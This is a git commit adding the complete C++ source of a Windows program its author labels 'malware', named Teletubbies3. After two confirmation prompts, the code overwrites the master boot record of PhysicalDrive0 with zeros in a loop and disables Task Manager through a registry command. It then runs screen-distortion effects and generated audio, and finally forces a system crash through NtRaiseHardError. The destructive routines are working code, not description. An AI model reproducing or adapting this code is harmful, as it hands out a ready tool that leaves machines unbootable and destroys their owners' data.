6026969b34d1bae361c108b022e3253db995806a
pankozaC++ <77279607+pankoza-pl@users.noreply.github.com>
2022-11-15 19:10:15 +0100

    Add files via upload

---
+++ Teletubbies3/Teletubbies3/Teletubbies3.cpp
@@ -0,0 +1,206 @@
+// Teletubbies3.cpp : malware by pankoza
+//
+
+#include <Windows.h>
+#include <cmath> 
+#define M_PI 3.14159265358979323846264338327950288
+#pragma comment(lib, "winmm.lib")
+typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+typedef union _RGBQUAD {
+	COLORREF rgb;
+	struct {
+		BYTE r;
+		BYTE g;
+		BYTE b;
+		BYTE Reserved;
+	};
+}_RGBQUAD, * PRGBQUAD;
+DWORD WINAPI mbr(LPVOID lpParam) {
+	while (1) {
+		char mbrData[512];
+
+		ZeroMemory(&mbrData, (sizeof mbrData));
+
+		HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+
+		DWORD write;
+
+		WriteFile(MBR, mbrData, 512, &write, NULL);
+
+		CloseHandle(MBR);
+	}
+}
+DWORD WINAPI d(LPVOID lpParam) {
+	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
+	return 1;
+}
+DWORD WINAPI swirl(LPVOID lpParam) {
+	HDC desk = GetDC(0);
+	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
+	while (1) {
+		HDC desk = GetDC(0);
+		for (int i = 0; i < sh * 2; i++) {
+			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
+			BitBlt(desk, i, 0, 1, sh, desk, i, wave, SRCINVERT);
+		}
+		for (int i = 0; i < sw * 2; i++) {
+			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
+			BitBlt(desk, 0, i, sw, 1, desk, wave, i, SRCINVERT);
+		}
+		ReleaseDC(0, desk);
+	}
+}
+DWORD WINAPI textouts(LPVOID lpvd)
+{
+	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
+	LPCSTR text = 0;
+	while (1)
+	{
+		HDC hdc = GetDC(0);
+		SetBkMode(hdc, 0);
+		text = "Teletubbies3.exe";
+		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
+		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
+		SelectObject(hdc, font);
+		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
+		Sleep(100);
+		DeleteObject(font);
+		ReleaseDC(0, hdc);
+	}
+}
+DWORD WINAPI shader1(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			rgbScreen[i].rgb ^= x ^ y;
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
+DWORD WINAPI shader2(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h+10, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
+VOID WINAPI sound1() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>((t | (t >> 9 | t >> 7)) * t & (t >> 11 | t >> 9));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound2() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * ((t >> 7) & 42));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound3() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (((t & 4096) ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (2 & -t >> ((t & 2048) ? 2 : 4)));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+int main()
+{
+	if (MessageBoxW(NULL, L"Run Short Malware?", L"Teletubbies3.exe by pankoza", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+	{
+		ExitProcess(0);
+	}
+	else
+	{
+		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the MBR, continue?", L"Last Warning - Teletubbies3.exe by pankoza", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+		{
+			ExitProcess(0);
+		}
+		else
+		{
+			CreateThread(0, 0, mbr, 0, 0, 0);
+			CreateThread(0, 0, d, 0, 0, 0);
+			Sleep(5000);
+			HANDLE thread1 = CreateThread(0, 0, swirl, 0, 0, 0);
+			HANDLE thread1dot1 = CreateThread(0, 0, textouts, 0, 0, 0);
+			sound1();
+			Sleep(30000);
+			TerminateThread(thread1, 0);
+			CloseHandle(thread1);
+			TerminateThread(thread1dot1, 0);
+			CloseHandle(thread1dot1);
+			InvalidateRect(0, 0, 0);
+			HANDLE thread2 = CreateThread(0, 0, shader1, 0, 0, 0);
+			sound2();
+			Sleep(30000);
+			TerminateThread(thread2, 0);
+			CloseHandle(thread2);
+			InvalidateRect(0, 0, 0);
+			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
+			HANDLE thread3dot1 = CreateThread(0, 0, textouts, 0, 0, 0);
+			sound3();
+			Sleep(30000);
+			BOOLEAN bl;
+			DWORD response;
+			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
+			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
+			RtlAdjustPrivilege(19, 1, 0, &bl);
+			NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);
+			Sleep(-1);
+		}
+	}
+}
